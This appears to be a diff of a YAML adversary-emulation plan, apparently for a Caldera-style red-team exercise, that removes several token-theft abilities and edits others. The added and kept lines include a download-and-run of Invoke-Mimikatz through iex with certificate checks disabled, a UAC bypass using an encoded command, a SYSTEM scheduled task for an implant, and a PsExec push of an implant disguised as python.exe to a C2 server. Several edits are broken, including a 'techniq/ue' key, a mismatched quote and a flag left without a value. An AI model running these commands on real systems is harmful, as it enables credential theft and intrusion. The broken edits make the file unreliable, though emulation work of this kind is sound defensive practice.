@@ -294,42 +294,6 @@
           exit 1;
         }
 
-- id: 1345bff7-6f26-43b2-a92a-9aabccdb3db0
-  name: Bypass User Account Control
-  description: A UAC bypass technique is executed to steal the token of an existing high-integrity process and launch a new, high-integrity RAT with limited functionality.
-  tactic: privilege-escalation
-  technique:
-    attack_id: T1134.001
-    name: "Access Token Manipulation: Token Impersonation/Theft"
-  cti_source: "https://www.slideshare.net/MatthewDunwoody1/no-easy-breach-derby-con-2016"
-  procedure_group: procedure_privesc
-  procedure_step: "3.A.2"
-  platforms:
-    windows:
-      psh,pwsh:
-        command: |
-          Import-Module .\Invoke-BypassUACTokenManipulation.ps1 -Verbose -Force;
-          Move-Item -Path .\update.ps1 -Destination $env:APPDATA -Force;
-          $pcode = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("Import-Module $env:APPDATA\update.ps1;update('#{server}')"));
-          Invoke-BypassUACTokenManipulation -Arguments "-nop -exec bypass -EncodedCommand $pcode" -Verbose
-        payloads:
-        - update.ps1
-        - Invoke-BypassUACTokenManipulation.ps1
-
-  input_arguments:
-    server:
-      description: IP or Hostname of server
-      type: string
-      default: 10.0.17.3
-
-  executors:
-  - name: powershell
-    command: |
-      Import-Module .\Invoke-BypassUACTokenManipulation.ps1 -Verbose -Force;
-      Move-Item -Path .\update.ps1 -Destination $env:APPDATA -Force;
-      $pcode = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("Import-Module $env:APPDATA\update.ps1;update('#{server}')"));
-      Invoke-BypassUACTokenManipulation -Arguments "-nop -exec bypass -EncodedCommand $pcode" -Verbose
-
 - id: 89e9dffa-8836-4672-8cf3-bebd006d2a2b
   name: UAC Bypass via Backup Utility
   description: Modify registry values of sdclt to bypass UAC
@@ -601,10 +565,8 @@
             exit 1;
           }
           Set-Location -path "C:\Program Files\SysInternalsSuite";
-          gci $env:userprofile\Desktop;
-          .\sdelete64.exe /accepteula "$env:USERPROFILE\Desktop\‮cod.3aka3.scr";
+          gci "$env:APPDATA";
           .\sdelete64.exe /accepteula "$env:APPDATA\Draft.Zip";
-          .\sdelete64.exe /accepteula "$env:USERPROFILE\Downloads\SysInternalsSuite.zip";
 
   executors:
   - name: powershell
@@ -614,11 +576,10 @@
         exit 1;
       }
       Set-Location -path "C:\Program Files\SysInternalsSuite";
-      gci $env:userprofile\Desktop;
+      gci "$env:APPDATA";
       .\sdelete64.exe /accepteula "$env:USERPROFILE\Desktop\‮cod.3aka3.scr";
       .\sdelete64.exe /accepteula "$env:APPDATA\Draft.Zip";
-      .\sdelete64.exe /accepteula "$env:USERPROFILE\Downloads\SysInternalsSuite.zip";
-
+      
 - id: 6f1f4768-7099-45d2-a858-b49dc792234e
   name: Loading Stage-2 & Performing Discovery
   description: Load Stage-2 from Modified Sysinternals Toolset
@@ -678,7 +639,8 @@
         command: |
           [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };
           $web = (New-Object System.Net.WebClient);
-          $result = $web.DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1");
+          $url = "https://raw.githubusercontent.com/BC-SECURITY/Empire/main/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1";
+          $result = $web.DownloadString($url);
           iex $result;
           function hashdump
           {
@@ -691,7 +653,8 @@
     command: |
       [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };
       $web = (New-Object System.Net.WebClient);
-      $result = $web.DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1");
+      $url = "https://raw.githubusercontent.com/BC-SECURITY/Empire/main/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1";
+      $result = $web.DownloadString($url);
       iex $result;
       function hashdump
       {
@@ -789,53 +752,6 @@
         return 1;
       }
 
-- id: 03afada1-1714-408f-bde5-f528b91dc89d
-  name: Access Token Manipulation
-  description: A token theft script was executed to steal and assume the token of another user’s existing process, changing the user context of the process.
-  tactic: defensive-evasion
-  technique:
-    attack_id: T1134
-    name: "Access Token Manipulation"
-  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
-  procedure_group: procedure_def_evasion
-  procedure_step: "5.B.2"
-  platforms:
-    windows:
-      psh,pwsh:
-        command: |
-          Import-Module .\StealToken.ps1 -Verbose -Force;
-          StealToken;
-          CreateProcessWithToken -CommandLine 'cmd.exe /c reg query "\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server"';
-          CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn "Resume Viewer Update Checker" /tr ".\sandcat.exe #{server} evals" /sc ONLOGON /RU SYSTEM';
-          CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';
-          CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';
-          RevertToSelf;
-        payloads:
-        - StealToken.ps1
-        - sandcat.go-windows
-
-  input_arguments:
-    remote.file.share:
-      description: IP or Hostname of remote file share
-      type: string
-      default: 10.0.17.3
-
-    server:
-      description: IP or Hostname of server
-      type: string
-      default: 127.0.0.1
-
-  executors:
-  - name: powershell
-    command: |
-      Import-Module .\StealToken.ps1 -Verbose -Force;
-      StealToken;
-      CreateProcessWithToken -CommandLine 'cmd.exe /c reg query "\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server"';
-      CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn "Resume Viewer Update Checker" /tr ".\sandcat.exe #{server} evals" /sc ONLOGON /RU SYSTEM';
-      CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';
-      CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';
-      RevertToSelf;
-
 # Step 6 - Credential Access
 
 - id: e7cab9bb-3e3a-4d93-99cc-3593c1dc8c6d
@@ -870,53 +786,6 @@
 
       Set-Location -path "C:\Program Files\SysinternalsSuite";
       ./accesschk.exe -accepteula .;
-
-- id: 1b9e018d-986d-42d9-bb8b-0e104e98ce9c
-  name: Query Registry
-  description: A token theft script was executed to steal and assume the token of another user’s existing process, changing the user context of the process.
-  tactic: defensive-evasion
-  technique:
-    attack_id: T1134
-    name: "Access Token Manipulation"
-  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
-  procedure_group: procedure_def_evasion
-  procedure_step: "6.A.2"
-  platforms:
-    windows:
-      psh,pwsh:
-        command: |
-          Import-Module .\StealToken.ps1 -Verbose -Force;
-          StealToken;
-          CreateProcessWithToken -CommandLine 'cmd.exe /c reg query "\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server"';
-          CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn "Resume Viewer Update Checker" /tr ".\sandcat.exe #{server} evals" /sc ONLOGON /RU SYSTEM';
-          CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';
-          CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';
-          RevertToSelf;
-        payloads:
-        - StealToken.ps1
-        - sandcat.go-windows
-
-  input_arguments:
-    remote.file.share:
-      description: IP or Hostname of remote file share
-      type: string
-      default: 10.0.17.4
-
-    server:
-      description: IP or Hostname of server
-      type: string
-      default: 10.0.17.3
-
-  executors:
-  - name: powershell
-    command: |
-      Import-Module .\StealToken.ps1 -Verbose -Force;
-      StealToken;
-      CreateProcessWithToken -CommandLine 'cmd.exe /c reg query "\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server"';
-      CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn "Resume Viewer Update Checker" /tr ".\sandcat.exe #{server} evals" /sc ONLOGON /RU SYSTEM';
-      CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';
-      CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';
-      RevertToSelf;
 
 - id: c4f4b13c-87b6-498c-b814-93570173068c
   name: Credentials In Files (T1081) - Private Keys Extraction
@@ -1169,100 +1038,6 @@
         write-host "[!] Data exfil failed!";
       }
 
-- id: 9b518cfb-125f-466e-872b-4f8171773ce5
-  name: Remote File Copy (T1105)
-  description: A token theft script was executed to steal and assume the token of another user’s existing process, changing the user context of the process.
-  tactic: defensive-evasion
-  technique:
-    attack_id: T1134.001
-    name: "Access Token Manipulation: Token Impersonation/Theft"
-  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
-  procedure_group: procedure_def_evasion
-  procedure_step: "7.B.2"
-  platforms:
-    windows:
-      psh,pwsh:
-        command: |
-          Import-Module .\StealToken.ps1 -Verbose -Force;
-          StealToken;
-          CreateProcessWithToken -CommandLine 'cmd.exe /c reg query "\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server"';
-          CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn "Resume Viewer Update Checker" /tr ".\sandcat.exe #{server} evals" /sc ONLOGON /RU SYSTEM';
-          CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';
-          CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';
-          RevertToSelf;
-        payloads:
-        - StealToken.ps1
-        - sandcat.go-windows
-
-  input_arguments:
-    remote.file.share:
-      description: IP or Hostname of remote file share
-      type: string
-      default: 10.0.17.4
-
-    server:
-      description: IP or Hostname of server
-      type: string
-      default: 10.0.17.3
-
-  executors:
-  - name: powershell
-    command: |
-      Import-Module .\StealToken.ps1 -Verbose -Force;
-      StealToken;
-      CreateProcessWithToken -CommandLine 'cmd.exe /c reg query "\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server"';
-      CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn "Resume Viewer Update Checker" /tr ".\sandcat.exe #{server} evals" /sc ONLOGON /RU SYSTEM';
-      CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';
-      CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';
-      RevertToSelf;
-
-- id: 6b90da47-13d0-48fc-8f07-0a1e6d5d876e
-  name: Scheduled Tasks (T1053)
-  description: A token theft script was executed to steal and assume the token of another user’s existing process, changing the user context of the process.
-  tactic: defensive-evasion
-  technique:
-    attack_id: T1134.001
-    name: "Access Token Manipulation: Token Impersonation/Theft"
-  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
-  procedure_group: procedure_def_evasion
-  procedure_step: "7.C.1"
-  platforms:
-    windows:
-      psh,pwsh:
-        command: |
-          Import-Module .\StealToken.ps1 -Verbose -Force;
-          StealToken;
-          CreateProcessWithToken -CommandLine 'cmd.exe /c reg query "\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server"';
-          CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn "Resume Viewer Update Checker" /tr ".\sandcat.exe #{server} evals" /sc ONLOGON /RU SYSTEM';
-          CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';
-          CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';
-          RevertToSelf;
-        payloads:
-        - StealToken.ps1
-        - sandcat.go-windows
-
-  input_arguments:
-    remote.file.share:
-      description: IP or Hostname of remote file share
-      type: string
-      default: 10.0.17.4
-
-    server:
-      description: IP or Hostname of server
-      type: string
-      default: 10.0.17.3
-
-  executors:
-  - name: powershell
-    command: |
-      Import-Module .\StealToken.ps1 -Verbose -Force;
-      StealToken;
-      CreateProcessWithToken -CommandLine 'cmd.exe /c reg query "\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server"';
-      CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn "Resume Viewer Update Checker" /tr ".\sandcat.exe #{server} evals" /sc ONLOGON /RU SYSTEM';
-      CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';
-      CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';
-      RevertToSelf;
-
 # Step 8 - Lateral Movement
 
 - id: 95564347-e77a-4a89-b08f-dcafa5468f2c
@@ -1314,59 +1089,11 @@
     windows:
       psh:
         command: |
-          Invoke-Command -ComputerName "$(hostname)" -ScriptBlock { Get-Process -IncludeUserName | Select-Object UserName,SessionId | Where-Object { $_.UserName -like "*\$env:USERNAME" } | Sort-Object SessionId -Unique } | Select-Object UserName,SessionId -Last 1;
-
+          Invoke-Command -ComputerName "DESKTOP-22K14OG" -Credential (Get-Credential) -Authentication Negotiate -ScriptBlock { Get-Process -IncludeUserName | Select-Object UserName, SessionId | Where-Object { $_.UserName -like "*$env:USERNAME" } | Sort-Object SessionId -Unique } | Select-Object UserName, SessionId
   executors:
   - name: powershell
     command: |
-      Invoke-Command -ComputerName "$(hostname)" -ScriptBlock { Get-Process -IncludeUserName | Select-Object UserName,SessionId | Where-Object { $_.UserName -like "*\$env:USERNAME" } | Sort-Object SessionId -Unique } | Select-Object UserName,SessionId -Last 1;
-
-- id: 9fefcde6-083a-4440-8eca-dc03d30c0bcb
-  name: File and Directory Discovery (T1083)
-  description: A token theft script was executed to steal and assume the token of another user’s existing process, changing the user context of the process.
-  tactic: defensive-evasion
-  technique:
-    attack_id: T1134.001
-    name: "Access Token Manipulation: Token Impersonation/Theft"
-  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
-  procedure_group: procedure_def_evasion
-  procedure_step: "8.A.3"
-  platforms:
-    windows:
-      psh,pwsh:
-        command: |
-          Import-Module .\StealToken.ps1 -Verbose -Force;
-          StealToken;
-          CreateProcessWithToken -CommandLine 'cmd.exe /c reg query "\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server"';
-          CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn "Resume Viewer Update Checker" /tr ".\sandcat.exe #{server} evals" /sc ONLOGON /RU SYSTEM';
-          CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';
-          CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';
-          RevertToSelf;
-        payloads:
-        - StealToken.ps1
-        - sandcat.go-windows
-
-  input_arguments:
-    remote.file.share:
-      description: IP or Hostname of remote file share
-      type: string
-      default: 10.0.17.4
-
-    server:
-      description: IP or Hostname of server
-      type: string
-      default: 10.0.17.3
-
-  executors:
-  - name: powershell
-    command: |
-      Import-Module .\StealToken.ps1 -Verbose -Force;
-      StealToken;
-      CreateProcessWithToken -CommandLine 'cmd.exe /c reg query "\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server"';
-      CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn "Resume Viewer Update Checker" /tr ".\sandcat.exe #{server} evals" /sc ONLOGON /RU SYSTEM';
-      CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';
-      CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';
-      RevertToSelf;
+      Invoke-Command -ComputerName "DESKTOP-22K14OG" -Credential (Get-Credential) -Authentication Negotiate -ScriptBlock { Get-Process -IncludeUserName | Select-Object UserName, SessionId | Where-Object { $_.UserName -like "*$env:USERNAME" } | Sort-Object SessionId -Unique } | Select-Object UserName, SessionId
 
 - id: bddc0abc-07a0-41b7-813f-e0c64d9226b3
   name: Copy Sandcat File
@@ -1382,10 +1109,9 @@
     windows:
       psh,pwsh:
         command: |
-          move-item sandcat.go-windows-upx C:\Windows\temp\python.exe -force;
+          move-item sandcat.go-windows-upx C:\Windows\temp\python.exe -force
           set-location "C:\Program Files\SysinternalsSuite\";
-          .\PsExec64.exe -accepteula \\#{pivot_machine_hostname} -i #{user.session.id} -d -f -c "C:\Windows\Temp\python.exe" -group "day-1-lateral-movement" -server "#{server}";
-          tasklist /S #{pivot_machine_hostname} /FI "IMAGENAME eq python.exe";
+          .\PsExec64.exe -accepteula \\DESKTOP-22K14OG -i 0 -d -f -c "C:\Windows\Temp\python.exe" -group -server "http://192.168.1.45:8888";  tasklist /S DESKTOP-22K14OG /FI "IMAGENAME eq python.exe”
         payloads:
         - sandcat.go-windows-upx
 
@@ -1393,7 +1119,7 @@
     pivot_machine_hostname:
       description: Hostname of pivot machine
       type: string
-      default: DESKTOP-1EA6OI1
+      default: DESKTOP-22K14OG
 
     user.session.id:
       description: Session id for user
@@ -1403,7 +1129,7 @@
     server:
       description: IP or Hostname of server
       type: string
-      default: 10.0.17.3
+      default: 192.168.1.45
 
   executors:
   - name: powershell
@@ -1450,7 +1176,7 @@
     windows:
       psh,pwsh:
         command: |
-          ls #{remote.file.share}
+          ls 10.0.17.4
 
   input_arguments:
     remote.file.share:
@@ -1461,7 +1187,7 @@
   executors:
   - name: powershell
     command: |
-      ls #{remote.file.share}
+      ls 10.0.17.4
 
 - id: 08e57385-dbce-4850-8bb7-589ef79465ab
   name: Automated document collection (T1119)
@@ -1496,7 +1222,7 @@
   name: Data from staged file (T1074) and Exfiltration over C2 Channel (T1041)
   description: Copy a target file from a remote file share through the existing C2 channel
   tactic: exfiltration
-  technique:
+  techniq/ue:
     attack_id: T1041
     name: "Exfiltration Over C2 Channel"
   cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
@@ -1522,7 +1248,7 @@
     server:
       description: IP or Hostname of server
       type: string
-      default: 10.0.17.3
+      default: 192.168.1.45
 
   executors:
   - name: powershell
